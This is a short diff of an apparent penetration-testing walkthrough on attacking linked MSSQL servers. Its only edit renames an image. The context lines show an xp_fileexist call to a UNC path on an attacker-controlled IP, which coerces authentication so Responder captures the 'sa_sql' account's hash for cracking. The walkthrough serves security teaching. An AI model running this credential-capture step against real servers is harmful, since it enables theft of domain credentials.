@@ -557,7 +557,7 @@ EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
 
 3\. If we check our Responder output we can see that we captured the hash from the user `sa_sql` from the domain `Secure`.
 
-![](<../../../.gitbook/assets/image (38).png>)
+![](<../../../.gitbook/assets/image (38) (1).png>)
 
 ### 9. Crack SQL account hash
 
